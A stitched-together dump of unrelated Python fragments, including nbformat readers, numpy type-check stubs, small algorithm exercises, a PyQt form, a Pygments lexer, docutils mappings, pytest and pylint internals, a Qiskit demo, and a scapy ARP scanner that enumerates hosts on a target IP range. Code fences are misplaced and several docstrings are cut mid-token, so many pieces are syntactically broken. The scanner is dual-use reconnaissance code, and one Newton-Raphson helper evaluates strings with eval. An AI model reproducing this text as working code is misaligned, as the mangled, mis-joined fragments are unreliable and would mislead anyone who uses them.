        nb = copy.deepcopy(nb)
        nb = strip_transient(nb)
        if kwargs.pop('split_lines', True):
            nb = split_lines(nb)
        return json.dumps(nb, **kwargs)


_reader = JSONReader()
_writer = JSONWriter()

reads = _reader.reads
read = _reader.read
to_notebook = _reader.to_notebook
write = _writer.write
writes = _writer.writes

```

`pyREMOVED: Read and write notebook files as XML.`

````py


REMOVED_MSG = """\
Reading notebooks as XML has been removed to harden security and avoid
possible denial-of-service attacks.

The XML notebook format was deprecated before the Jupyter (previously IPython)
Notebook was ever released. We are not aware of anyone using it, so we have
removed it.

If you were using this code, and you need to continue using it, feel free to
fork an earlier version of the nbformat package and maintain it yourself.
The issue which prompted this removal is:

https://github.com/jupyter/nbformat/issues/132```


```py

def reads(s, **kwargs):
    raise Exception(REMOVED_MSG)

def read(fp, **kwargs):
    raise Exception(REMOVED_MSG)

def to_notebook(root, **kwargs):
    raise Exception(REMOVED_MSG)

import numpy as np

# Ban setting dtype since mutating the type of the array in place
# makes having ndarray be generic over dtype impossible. Generally
# users should use `ndarray.view` in this situation anyway. See
#
# https://github.com/numpy/numpy-stubs/issues/7
#
# for more context.
float_array = np.array([1.0])
float_array.dtype = np.bool_  # E: Property "dtype" defined in "ndarray" is read-only

import numpy as np

nd = np.array([[1, 2], [3, 4]])

# item
reveal_type(nd.item())  # E: Any
reveal_type(nd.item(1))  # E: Any
reveal_type(nd.item(0, 1))  # E: Any
reveal_type(nd.item((0, 1)))  # E: Any

# tolist
reveal_type(nd.tolist())  # E: Any

# itemset does not return a value
# tostring is pretty simple
# tobytes is pretty simple
# tofile does not return a value
# dump does not return a value
# dumps is pretty simple

# astype
reveal_type(nd.astype("float"))  # E: numpy.ndarray
reveal_type(nd.astype(float))  # E: numpy.ndarray
reveal_type(nd.astype(float, "K"))  # E: numpy.ndarray
reveal_type(nd.astype(float, "K", "unsafe"))  # E: numpy.ndarray
reveal_type(nd.astype(float, "K", "unsafe", True))  # E: numpy.ndarray
reveal_type(nd.astype(float, "K", "unsafe", True, True))  # E: numpy.ndarray

# byteswap
reveal_type(nd.byteswap())  # E: numpy.ndarray
reveal_type(nd.byteswap(True))  # E: numpy.ndarray

# copy
reveal_type(nd.copy())  # E: numpy.ndarray
reveal_type(nd.copy("C"))  # E: numpy.ndarray

# view
class SubArray(np.ndarray):
    pass


reveal_type(nd.view())  # E: numpy.ndarray
reveal_type(nd.view(np.int64))  # E: numpy.ndarray
# replace `Any` with `numpy.matrix` when `matrix` will be added to stubs
reveal_type(nd.view(np.int64, np.matrix))  # E: Any
reveal_type(nd.view(np.int64, SubArray))  # E: SubArray

# getfield
reveal_type(nd.getfield("float"))  # E: numpy.ndarray
reveal_type(nd.getfield(float))  # E: numpy.ndarray
reveal_type(nd.getfield(float, 8))  # E: numpy.ndarray

# setflags does not return a value
# fill does not return a value
````

```py
Tests for miscellaneous (non-magic) ``np.ndarray``/``np.generic`` methods.

More extensive tests are performed for the methods'
function-based counterpart in `../from_numeric.py`.
```

```py

from typing import Any
import numpy as np

f8: np.float64
AR_f8: np.ndarray[Any, np.dtype[np.float64]]
AR_M: np.ndarray[Any, np.dtype[np.datetime64]]
AR_b: np.ndarray[Any, np.dtype[np.bool_]]

ctypes_obj = AR_f8.ctypes

reveal_type(ctypes_obj.get_data())  # E: has no attribute
reveal_type(ctypes_obj.get_shape())  # E: has no attribute
reveal_type(ctypes_obj.get_strides())  # E: has no attribute
reveal_type(ctypes_obj.get_as_parameter())  # E: has no attribute

f8.argpartition(0)  # E: has no attribute
f8.diagonal()  # E: has no attribute
f8.dot(1)  # E: has no attribute
f8.nonzero()  # E: has no attribute
f8.partition(0)  # E: has no attribute
f8.put(0, 2)  # E: has no attribute
f8.setfield(2, np.float64)  # E: has no attribute
f8.sort()  # E: has no attribute
f8.trace()  # E: has no attribute

AR_M.__int__()  # E: Invalid self argument
AR_M.__float__()  # E: Invalid self argument
AR_M.__complex__()  # E: Invalid self argument
AR_b.__index__()  # E: Invalid self argument

import numpy as np

nd1 = np.array([[1, 2], [3, 4]])

# reshape
nd1.reshape(4)
nd1.reshape(2, 2)
nd1.reshape((2, 2))

nd1.reshape((2, 2), order="C")
nd1.reshape(4, order="C")

# resize
nd1.resize()
nd1.resize(4)
nd1.resize(2, 2)
nd1.resize((2, 2))

nd1.resize((2, 2), refcheck=True)
nd1.resize(4, refcheck=True)

nd2 = np.array([[1, 2], [3, 4]])

# transpose
nd2.transpose()
nd2.transpose(1, 0)
nd2.transpose((1, 0))

# swapaxes
nd2.swapaxes(0, 1)

# flatten
nd2.flatten()
nd2.flatten("C")

# ravel
nd2.ravel()
nd2.ravel("C")

# squeeze
nd2.squeeze()

nd3 = np.array([[1, 2]])
nd3.squeeze(0)

nd4 = np.array([[[1, 2]]])
nd4.squeeze((0, 1))

import copy
import numpy as np

nditer_obj: np.nditer

with nditer_obj as context:
    reveal_type(context)   # E: numpy.nditer

reveal_type(len(nditer_obj))  # E: builtins.int
reveal_type(copy.copy(nditer_obj))  # E: numpy.nditer
reveal_type(next(nditer_obj))  # E: Any
reveal_type(iter(nditer_obj))  # E: typing.Iterator[Any]
reveal_type(nditer_obj[1])  # E: Any
reveal_type(nditer_obj[1:5])  # E: Any

nditer_obj[1] = 1
nditer_obj[1:5] = 1
del nditer_obj[1]
del nditer_obj[1:5]

# Find the nearest root and its square


def nearest_square(n):
    i = 0
    found = False
    while not found:
        if i ** 2 <= n < ((i + 1) ** 2):
            found = True
        else:
            i += 1
    return (i, i ** 2)


# Test
case = 40
res = nearest_square(case)
print("Nearest square to {}: \n{}".format(case, res[1]))

'''
The nested brackets problem is a problem that determines if a sequence of
brackets are properly nested.  A sequence of brackets s is considered properly nested
if any of the following conditions are true:

 - s is empty
 - s has the form (U) or [U] or {U} where U is a properly nested string
 - s has the form VW where V and W are properly nested strings

For example, the string "()()[()]" is properly nested but "[(()]" is not.

The function called is_balanced takes as input a string S which is a sequence of brackets and
returns true if S is nested and false otherwise.

'''
from __future__ import print_function


def is_balanced(S):

    stack = []
    open_brackets = set({'(', '[', '{'})
    closed_brackets = set({')', ']', '}'})
    open_to_closed = dict({'{':'}', '[':']', '(':')'})

    for i in range(len(S)):

        if S[i] in open_brackets:
            stack.append(S[i])

        elif S[i] in closed_brackets:
            if len(stack) == 0 or (len(stack) > 0 and open_to_closed[stack.pop()] != S[i]):
                return False

    return len(stack) == 0


def main():

    S = input("Enter sequence of brackets: ")

    if is_balanced(S):
        print((S, "is balanced"))

    else:
        print((S, "is not balanced"))


if __name__ == "__main__":
    main()
```

````py
4
0000
101
111000
1


Case #1: 0000
Case #2: (1)0(1)
Case #3: (111)000
Case #4: (1)```


```py
import re


def nestingDepth(s):
    l = re.findall(r"(0+|1+|2+|3+|4+|5+|6+|7+|8+|9+)", s)
    out = ""
    open_p = 0
    for i in range(len(l)):
        n = int(l[i][0])
        if open_p < n:
            new_p = n - open_p
            out += "(" * new_p + l[i]
            open_p += new_p
        else:
            out += l[i]
        if i + 1 < len(l):
            n = int(l[i + 1][0])
            if n < int(l[i][0]):
                close_p = open_p - n
                out += ")" * close_p
                open_p -= close_p
        else:
            out += ")" * open_p
    return out


t = int(input())  # read a line with a single integer
for i in range(1, t + 1):
    s = input()
    print("Case #{}: {}".format(i, nestingDepth(s)))

import scapy.all as scapy
import optparse


def get_arguments():  # function to pass input in console
    parser = optparse.OptionParser()
    parser.add_option("-t",
                      "--target",
                      dest="target",
                      help="Target IP / IP range.")
    options, arguments = parser.parse_args()
    return options


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)  # destinationn ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.summary())
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    # print(answered_list.summary())
    # print(unanswered.summary())

    clients_list = []
    for element in answered_list:
        clients_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(clients_dict)
        # print(element[1].psrc +"\t\t"+element[1].hwsrc)

    return (clients_list)


def print_result(result_list):
    print(
        "IP\t\t\tMAC ADDRESS\n.........................................................................."
    )
    for client in result_list:
        print(client["ip"] + "\t\t" + client["mac"])


options = get_arguments()
scan_result = scan(options.target)
print_result(scan_result)

# pre code
# main list of contacts
contacts = {}

# funcs of pre code
# func to add new contact
def newContact():
    while True:
        newContact = raw_input("Name for new Contact : ")
        numForNewContact = raw_input("Number for Contact : ")
        add = raw_input("Add or Try again :")
        if add.strip() == "Add":
            contacts[newContact] = numForNewContact
            print("Contact Successfully added.")
            break
        elif add.strip() == "Try again":
            continue
        else:
            print("Invalid Input.try again")
            continue
        startAgain = raw_input("Add more or continue : ")
        if startAgain.strip() == "Add more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# func to search for a contact
def searchContact():
    while True:
        search = raw_input("Search for contact : ")
        toShow = str(search) + contacts[search]
        print(toShow)
        startAgain = raw_input("Search more or continue : ")
        if startAgain.strip() == "Search more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# func to edit a contact
def editContact():
    while True:
        whichToEdit = raw_input("Name of Contact of which Number to Edit : ")
        contacts[whichToEdit] = raw_input("Number to add : ")
        startAgain = raw_input("Edit more or continue : ")
        if startAgain.strip() == "Edit more":
            print(" ")
            continue
        elif startAgain.strip() == "continue":
            print(" ")
            break


# main code to interact
while True:
    print("hello,".title())
    # part of main code to start or end
    startOrEnd = raw_input("Start or End : ")
    if startOrEnd.strip() == "Start":
        # part of main code to control functions
        addSearchEdit = raw_input("Add or Search or Edit : ")
        if addSearchEdit.strip() == "Add":
            print(newContact())
        elif addSearchEdit.strip() == "Search":
            print(searchContact())
        elif addSearchEdit.strip() == "Edit":
            print(editContact())
        else:
            print("Invalid Input . Try Again")
            continue
    elif startOrEnd.strip() == "End":
        print("Ending...")
        break
    else:
        print("Invalid Input . Try Again")
        continue
    # part of main code to start again or end
    startAgain = raw_input("Start again or End : ")
    if startAgain.strip() == "Start again":
        print("Starting  again...")
        continue
    elif startAgain.strip() == "End":
        print("Ending program...")
        break
    else:
        break

# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'new_task.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(498, 374)
        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(220, 250, 81, 241))
        self.buttonBox.setOrientation(QtCore.Qt.Vertical)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Cancel|QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")
        self.new_task_input = QtWidgets.QLineEdit(Dialog)
        self.new_task_input.setGeometry(QtCore.QRect(80, 170, 391, 21))
        self.new_task_input.setAlignment(QtCore.Qt.AlignCenter)
        self.new_task_input.setObjectName("new_task_input")
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(9, 143, 71, 71))
        font = QtGui.QFont()
        font.setFamily("NSimSun")
        font.setPointSize(14)
        self.label.setFont(font)
        self.label.setAlignment(QtCore.Qt.AlignCenter)
        self.label.setObjectName("label")

        self.retranslateUi(Dialog)
        self.buttonBox.accepted.connect(Dialog.accept)
        self.buttonBox.rejected.connect(Dialog.reject)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Dialog"))
        self.label.setText(_translate("Dialog", "Task:"))

# https://www.geeksforgeeks.org/newton-forward-backward-interpolation/

import math
from typing import List


# for calculating u value
def ucal(u: float, p: int) -> float:
    """
    >>> ucal(1, 2)
    0
    >>> ucal(1.1, 2)
    0.11000000000000011
    >>> ucal(1.2, 2)
    0.23999999999999994
    """
    temp = u
    for i in range(1, p):
        temp = temp * (u - i)
    return temp


def main() -> None:
    n = int(input("enter the numbers of values: "))
    y: List[List[float]] = []
    for i in range(n):
        y.append([])
    for i in range(n):
        for j in range(n):
            y[i].append(j)
            y[i][j] = 0

    print("enter the values of parameters in a list: ")
    x = list(map(int, input().split()))

    print("enter the values of corresponding parameters: ")
    for i in range(n):
        y[i][0] = float(input())

    value = int(input("enter the value to interpolate: "))
    u = (value - x[0]) / (x[1] - x[0])

    # for calculating forward difference table

    for i in range(1, n):
        for j in range(n - i):
            y[j][i] = y[j + 1][i - 1] - y[j][i - 1]

    summ = y[0][0]
    for i in range(1, n):
        summ += (ucal(u, i) * y[0][i]) / math.factorial(i)

    print(f"the value at {value} is {summ}")


if __name__ == "__main__":
    main()
````

```pyNewton's Method."""

# Newton's Method - https://en.wikipedia.org/wiki/Newton%27s_method
from typing import Callable

RealFunc = Callable[[float], float]  # type alias for a real -> real function


# function is the f(x) and derivative is the f'(x)
def newton(function: RealFunc, derivative: RealFunc, starting_int: int) -> float:
    """
    >>> newton(lambda x: x ** 3 - 2 * x - 5, lambda x: 3 * x ** 2 - 2, 3)
    2.0945514815423474
    >>> newton(lambda x: x ** 3 - 1, lambda x: 3 * x ** 2, -2)
    1.0
    >>> newton(lambda x: x ** 3 - 1, lambda x: 3 * x ** 2, -4)
    1.0000000000000102
    >>> import math
    >>> newton(math.sin, math.cos, 1)
    0.0
    >>> newton(math.sin, math.cos, 2)
    3.141592653589793
    >>> newton(math.cos, lambda x: -math.sin(x), 2)
    1.5707963267948966
    >>> newton(math.cos, lambda x: -math.sin(x), 0)
    Traceback (most recent call last):
    ...
    ZeroDivisionError: Could not find root
    """
    prev_guess = float(starting_int)
    while True:
        try:
            next_guess = prev_guess - function(prev_guess) / derivative(prev_guess)
        except ZeroDivisionError:
            raise ZeroDivisionError("Could not find root") from None
        if abs(prev_guess - next_guess) < 10 ** -5:
            return next_guess
        prev_guess = next_guess


def f(x: float) -> float:
    return (x ** 3) - (2 * x) - 5


def f1(x: float) -> float:
    return 3 * (x ** 2) - 2


if __name__ == "__main__":
    print(newton(f, f1, 3))

# Implementing Newton Raphson method in Python
# Author: Syed Haseeb Shah (github.com/QuantumNovice)
# The Newton-Raphson method (also known as Newton's method) is a way to
# quickly find a good approximation for the root of a real-valued function
from decimal import Decimal
from math import *  # noqa: F401, F403
from typing import Union

from sympy import diff


def newton_raphson(
    func: str, a: Union[float, Decimal], precision: float = 10 ** -10
) -> float:
    """Finds root from the point 'a' onwards by Newton-Raphson method
    >>> newton_raphson("sin(x)", 2)
    3.1415926536808043
    >>> newton_raphson("x**2 - 5*x +2", 0.4)
    0.4384471871911695
    >>> newton_raphson("x**2 - 5", 0.1)
    2.23606797749979
    >>> newton_raphson("log(x)- 1", 2)
    2.718281828458938
    """
    x = a
    while True:
        x = Decimal(x) - (Decimal(eval(func)) / Decimal(eval(str(diff(func)))))
        # This number dictates the accuracy of the answer
        if abs(eval(func)) < precision:
            return float(x)


# Let's Execute
if __name__ == "__main__":
    # Find root of trigonometric function
    # Find value of pi
    print(f"The root of sin(x) = 0 is {newton_raphson('sin(x)', 2)}")
    # Find root of polynomial
    print(f"The root of x**2 - 5*x + 2 = 0 is {newton_raphson('x**2 - 5*x + 2', 0.4)}")
    # Find Square Root of 5
    print(f"The root of log(x) - 1 = 0 is {newton_raphson('log(x) - 1', 2)}")
    # Exponential Roots
    print(f"The root of exp(x) - 1 = 0 is {newton_raphson('exp(x) - 1', 0)}")

from __future__ import print_function
# Function to print element and NGE pair for all elements of list
def printNGE(arr):

    for i in range(0, len(arr), 1):

        next = -1
        for j in range(i+1, len(arr), 1):
            if arr[i] < arr[j]:
                next = arr[j]
                break

        print(str(arr[i]) + " -- " + str(next))

# Driver program to test above function
arr = [11,13,21,3]
printNGE(arr)

arr = [-10, -5, 0, 5, 5.1, 11, 13, 21, 3, 4, -21, -10, -5, -1, 0]
expect = [-5, 0, 5, 5.1, 11, 13, 21, -1, 4, -1, -10, -5, -1, 0, -1]


def next_greatest_element_slow(arr: list) -> list:
    """
    Get the Next Greatest Element (NGE) for all elements in a list.
    Maximum element present after the current one which is also greater than the
    current one.
    >>> next_greatest_element_slow(arr) == expect
    True
    """
    result = []
    for i in range(0, len(arr), 1):
        next = -1
        for j in range(i + 1, len(arr), 1):
            if arr[i] < arr[j]:
                next = arr[j]
                break
        result.append(next)
    return result


def next_greatest_element_fast(arr: list) -> list:
    """
    Like next_greatest_element_slow() but changes the loops to use
    enumerate() instead of range(len()) for the outer loop and
    for in a slice of arr for the inner loop.
    >>> next_greatest_element_fast(arr) == expect
    True
    """
    result = []
    for i, outer in enumerate(arr):
        next = -1
        for inner in arr[i + 1 :]:
            if outer < inner:
                next = inner
                break
        result.append(next)
    return result


def next_greatest_element(arr: list) -> list:
    """
    Get the Next Greatest Element (NGE) for all elements in a list.
    Maximum element present after the current one which is also greater than the
    current one.

    A naive way to solve this is to take two loops and check for the next bigger
    number but that will make the time complexity as O(n^2). The better way to solve
    this would be to use a stack to keep track of maximum number giving a linear time
    solution.
    >>> next_greatest_element(arr) == expect
    True
    """
    stack = []
    result = [-1] * len(arr)

    for index in reversed(range(len(arr))):
        if len(stack):
            while stack[-1] <= arr[index]:
                stack.pop()
                if len(stack) == 0:
                    break

        if len(stack) != 0:
            result[index] = stack[-1]

        stack.append(arr[index])

    return result


if __name__ == "__main__":
    from doctest import testmod
    from timeit import timeit

    testmod()
    print(next_greatest_element_slow(arr))
    print(next_greatest_element_fast(arr))
    print(next_greatest_element(arr))

    setup = (
        "from __main__ import arr, next_greatest_element_slow, "
        "next_greatest_element_fast, next_greatest_element"
    )
    print(
        "next_greatest_element_slow():",
        timeit("next_greatest_element_slow(arr)", setup=setup),
    )
    print(
        "next_greatest_element_fast():",
        timeit("next_greatest_element_fast(arr)", setup=setup),
    )
    print(
        "     next_greatest_element():",
        timeit("next_greatest_element(arr)", setup=setup),
    )
```

````py
    pygments.lexers.nit
    ~~~~~~~~~~~~~~~~~~~

    Lexer for the Nit language.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, words
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Number, Punctuation

__all__ = ['NitLexer']


class NitLexer(RegexLexer):
    """
    For `nit <http://nitlanguage.org>`_ source.

    .. versionadded:: 2.0
    """

    name = 'Nit'
    aliases = ['nit']
    filenames = ['*.nit']
    tokens = {
        'root': [
            (r'#.*?$', Comment.Single),
            (words((
                'package', 'module', 'import', 'class', 'abstract', 'interface',
                'universal', 'enum', 'end', 'fun', 'type', 'init', 'redef',
                'isa', 'do', 'readable', 'writable', 'var', 'intern', 'extern',
                'public', 'protected', 'private', 'intrude', 'if', 'then',
                'else', 'while', 'loop', 'for', 'in', 'and', 'or', 'not',
                'implies', 'return', 'continue', 'break', 'abort', 'assert',
                'new', 'is', 'once', 'super', 'self', 'true', 'false', 'nullable',
                'null', 'as', 'isset', 'label', '__debug__'), suffix=r'(?=[\r\n\t( ])'),
             Keyword),
            (r'[A-Z]\w*', Name.Class),
            (r'"""(([^\'\\]|\\.)|\\r|\\n)*((\{\{?)?(""?\{\{?)*""""*)', String),  # Simple long string
            (r'\'\'\'(((\\.|[^\'\\])|\\r|\\n)|\'((\\.|[^\'\\])|\\r|\\n)|'
             r'\'\'((\\.|[^\'\\])|\\r|\\n))*\'\'\'', String),  # Simple long string alt
            (r'"""(([^\'\\]|\\.)|\\r|\\n)*((""?)?(\{\{?""?)*\{\{\{\{*)', String),  # Start long string
            (r'\}\}\}(((\\.|[^\'\\])|\\r|\\n))*(""?)?(\{\{?""?)*\{\{\{\{*', String),  # Mid long string
            (r'\}\}\}(((\\.|[^\'\\])|\\r|\\n))*(\{\{?)?(""?\{\{?)*""""*', String),  # End long string
            (r'"(\\.|([^"}{\\]))*"', String),  # Simple String
            (r'"(\\.|([^"}{\\]))*\{', String),  # Start string
            (r'\}(\\.|([^"}{\\]))*\{', String),  # Mid String
            (r'\}(\\.|([^"}{\\]))*"', String),  # End String
            (r'(\'[^\'\\]\')|(\'\\.\')', String.Char),
            (r'[0-9]+', Number.Integer),
            (r'[0-9]*.[0-9]+', Number.Float),
            (r'0(x|X)[0-9A-Fa-f]+', Number.Hex),
            (r'[a-z]\w*', Name),
            (r'_\w+', Name.Variable.Instance),
            (r'==|!=|<==>|>=|>>|>|<=|<<|<|\+|-|=|/|\*|%|\+=|-=|!|@', Operator),
            (r'\(|\)|\[|\]|,|\.\.\.|\.\.|\.|::|:', Punctuation),
            (r'`\{[^`]*`\}', Text),  # Extern blocks won't be Lexed by Nit
            (r'[\r\n\t ]+', Text),
        ],
    }

# $Id: nl.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Martijn Pieters <mjpieters@users.sourceforge.net>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Dutch-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      # fixed: language-dependent
      'author': 'Auteur',
      'authors': 'Auteurs',
      'organization': 'Organisatie',
      'address': 'Adres',
      'contact': 'Contact',
      'version': 'Versie',
      'revision': 'Revisie',
      'status': 'Status',
      'date': 'Datum',
      'copyright': 'Copyright',
      'dedication': 'Toewijding',
      'abstract': 'Samenvatting',
      'attention': 'Attentie!',
      'caution': 'Let op!',
      'danger': '!GEVAAR!',
      'error': 'Fout',
      'hint': 'Hint',
      'important': 'Belangrijk',
      'note': 'Opmerking',
      'tip': 'Tip',
      'warning': 'Waarschuwing',
      'contents': 'Inhoud'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      # language-dependent: fixed
      'auteur': 'author',
      'auteurs': 'authors',
      'organisatie': 'organization',
      'adres': 'address',
      'contact': 'contact',
      'versie': 'version',
      'revisie': 'revision',
      'status': 'status',
      'datum': 'date',
      'copyright': 'copyright',
      'toewijding': 'dedication',
      'samenvatting': 'abstract'}```


```pyDutch (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

class Node:
  def __init__(self, value, link_node=None):
    self.value = value
    self.link_node = link_node

  def set_next_node(self, link_node):
    self.link_node = link_node

  def get_next_node(self):
    return self.link_node

  def get_value(self):
    return self.value```


```py
    sphinx.builders.latex.nodes
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Additional nodes for LaTeX writer.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from docutils import nodes


class captioned_literal_block(nodes.container):
    """A node for a container of literal_block having a caption."""
    pass


class footnotemark(nodes.Inline, nodes.Referential, nodes.TextElement):
    """A node represents ``\footnotemark``."""
    pass


class footnotetext(nodes.General, nodes.BackLinkable, nodes.Element,
                   nodes.Labeled, nodes.Targetable):
    """A node represents ``\footnotetext``."""


class math_reference(nodes.Inline, nodes.Referential, nodes.TextElement):
    """A node for a reference for equation."""
    pass


class thebibliography(nodes.container):
    """A node for wrapping bibliographies."""
    pass


HYPERLINK_SUPPORT_NODES = (
    nodes.figure,
    nodes.literal_block,
    nodes.table,
    nodes.section,
    captioned_literal_block,
)

number_to_check = int(input("Number : "))
till_where = int(input("Till where to check : "))
list_of_non_multiples = []
for num in range(0, till_where + 1):
    if num % number_to_check != 0:
        list_of_non_multiples.append(num)

print(list_of_non_multiples)
# or you can do
# this
print(" ")
for element in list_of_non_multiples:
    print(element)

from numpy.distutils.fcompiler import FCompiler
from numpy.distutils import customized_fcompiler

compilers = ['NoneFCompiler']

class NoneFCompiler(FCompiler):

    compiler_type = 'none'
    description = 'Fake Fortran compiler'

    executables = {'compiler_f77': None,
                   'compiler_f90': None,
                   'compiler_fix': None,
                   'linker_so': None,
                   'linker_exe': None,
                   'archiver': None,
                   'ranlib': None,
                   'version_cmd': None,
                   }

    def find_executables(self):
        pass


if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    print(customized_fcompiler(compiler='none').get_version())
````

````pyRun testsuites written for nose."""
from _pytest import python
from _pytest import unittest
from _pytest.config import hookimpl
from _pytest.nodes import Item


@hookimpl(trylast=True)
def pytest_runtest_setup(item):
    if is_potential_nosetest(item):
        if not call_optional(item.obj, "setup"):
            # Call module level setup if there is no object level one.
            call_optional(item.parent.obj, "setup")
        # XXX This implies we only call teardown when setup worked.
        item.session._setupstate.addfinalizer((lambda: teardown_nose(item)), item)


def teardown_nose(item):
    if is_potential_nosetest(item):
        if not call_optional(item.obj, "teardown"):
            call_optional(item.parent.obj, "teardown")


def is_potential_nosetest(item: Item) -> bool:
    # Extra check needed since we do not do nose style setup/teardown
    # on direct unittest style classes.
    return isinstance(item, python.Function) and not isinstance(
        item, unittest.TestCaseFunction
    )


def call_optional(obj, name):
    method = getattr(obj, name, None)
    isfixture = hasattr(method, "_pytestfixturefunction")
    if method is not None and not isfixture and callable(method):
        # If there's any problems allow the exception to raise rather than
        # silently ignoring them.
        method()
        return True

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE


import astroid

from pylint import checkers, interfaces
from pylint.checkers import utils
from pylint.constants import BUILTINS


class NotChecker(checkers.BaseChecker):
    """checks for too many not in comparison expressions

    - "not not" should trigger a warning
    - "not" followed by a comparison should trigger a warning
    """

    __implements__ = (interfaces.IAstroidChecker,)
    msgs = {
        "C0113": (
            'Consider changing "%s" to "%s"',
            "unneeded-not",
            "Used when a boolean expression contains an unneeded negation.",
        )
    }
    name = "refactoring"
    reverse_op = {
        "<": ">=",
        "<=": ">",
        ">": "<=",
        ">=": "<",
        "==": "!=",
        "!=": "==",
        "in": "not in",
        "is": "is not",
    }
    # sets are not ordered, so for example "not set(LEFT_VALS) <= set(RIGHT_VALS)" is
    # not equivalent to "set(LEFT_VALS) > set(RIGHT_VALS)"
    skipped_nodes = (astroid.Set,)
    # 'builtins' py3, '__builtin__' py2
    skipped_classnames = [f"{BUILTINS}.{qname}" for qname in ("set", "frozenset")]

    @utils.check_messages("unneeded-not")
    def visit_unaryop(self, node):
        if node.op != "not":
            return
        operand = node.operand

        if isinstance(operand, astroid.UnaryOp) and operand.op == "not":
            self.add_message(
                "unneeded-not",
                node=node,
                args=(node.as_string(), operand.operand.as_string()),
            )
        elif isinstance(operand, astroid.Compare):
            left = operand.left
            # ignore multiple comparisons
            if len(operand.ops) > 1:
                return
            operator, right = operand.ops[0]
            if operator not in self.reverse_op:
                return
            # Ignore __ne__ as function of __eq__
            frame = node.frame()
            if frame.name == "__ne__" and operator == "==":
                return
            for _type in (utils.node_type(left), utils.node_type(right)):
                if not _type:
                    return
                if isinstance(_type, self.skipped_nodes):
                    return
                if (
                    isinstance(_type, astroid.Instance)
                    and _type.qname() in self.skipped_classnames
                ):
                    return
            suggestion = "{} {} {}".format(
                left.as_string(),
                self.reverse_op[operator],
                right.as_string(),
            )
            self.add_message(
                "unneeded-not", node=node, args=(node.as_string(), suggestion)
            )

#!/usr/bin/env python3```


```py
Build a simple bare-minimum quantum circuit that starts with a single
qubit (by default, in state 0) and inverts it. Run the experiment 1000
times and print the total count of the states finally observed.
Qiskit Docs: https://qiskit.org/documentation/getting_started.html```


```py

import qiskit as q


def single_qubit_measure(qubits: int, classical_bits: int) -> q.result.counts.Counts:
    """
    >>> single_qubit_measure(2, 2)
    {'11': 1000}
    >>> single_qubit_measure(4, 4)
    {'0011': 1000}
    """
    # Use Aer's qasm_simulator
    simulator = q.Aer.get_backend("qasm_simulator")

    # Create a Quantum Circuit acting on the q register
    circuit = q.QuantumCircuit(qubits, classical_bits)

    # Apply X (NOT) Gate to Qubits 0 & 1
    circuit.x(0)
    circuit.x(1)

    # Map the quantum measurement to the classical bits
    circuit.measure([0, 1], [0, 1])

    # Execute the circuit on the qasm simulator
    job = q.execute(circuit, simulator, shots=1000)

    # Return the histogram data of the results of the experiment.
    return job.result().get_counts(circuit)


if __name__ == "__main__":
    counts = single_qubit_measure(2, 2)
    print(f"Total count for various states are: {counts}")
````

```pyNotebookExporter class"""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

from .exporter import Exporter
import nbformat
from traitlets import Enum, default

class NotebookExporter(Exporter):
    """Exports to an IPython notebook.

    This is useful when you want to use nbconvert's preprocessors to operate on
    a notebook (e.g. to execute it) and then write it back to a notebook file.
    """

    nbformat_version = Enum(list(nbformat.versions),
        default_value=nbformat.current_nbformat,
        help="""The nbformat version to write.
        Use this to downgrade notebooks.
        """
    ).tag(config=True)

    @default('file_extension')
    def _file_extension_default(self):
        return '.ipynb'

    output_mimetype = 'application/json'
    export_from_notebook = "Notebook"

    def from_notebook_node(self, nb, resources=None, **kw):
        nb_copy, resources = super().from_notebook_node(nb, resources, **kw)
        if self.nbformat_version != nb_copy.nbformat:
            resources['output_suffix'] = '.v%i' % self.nbformat_version
        else:
            resources['output_suffix'] = '.nbconvert'
        output = nbformat.writes(nb_copy, version=self.nbformat_version)
        if not output.endswith("\n"):
            output = output + "\n"
        return output, resources
```

```pyNotebookNode - adding attribute access to dicts"""

from ipython_genutils.ipstruct import Struct
try:
    from collections.abc import Mapping
except ImportError:
    from collections import Mapping


class NotebookNode(Struct):
    """A dict-like node with attribute-access"""

    def __setitem__(self, key, value):
